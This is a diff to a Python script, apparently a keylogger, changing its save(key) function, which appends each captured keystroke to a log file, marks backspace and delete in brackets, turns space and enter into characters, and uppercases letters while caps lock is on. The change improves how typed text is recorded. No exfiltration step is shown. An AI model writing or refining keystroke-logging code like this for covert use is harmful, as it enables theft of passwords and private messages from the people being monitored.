@@ -43,13 +43,16 @@ def save(key):
     global log_file
     global caps_lock
 
-    with open(log_file, "a") as log:
-        if key.find("space") > 0:
-            log.write(' ')
+    with open(log_file, "a") as f:
+        if key.find("backspace") > 0 or key.find("delete") > 0:
+            f.write("["+key+"]")
+        elif key.find("space") > 0:
+            f.write(' ')
         elif key.find("enter") > 0:
-            log.write('\n')
+            f.write('\n')
+        
         elif key.find("Key") == -1:
-            log.write(key) if caps_lock == False else log.write(key.upper())
+            f.write(key) if caps_lock == False else f.write(key.upper())
 
 
 args_parser = ArgumentParser()
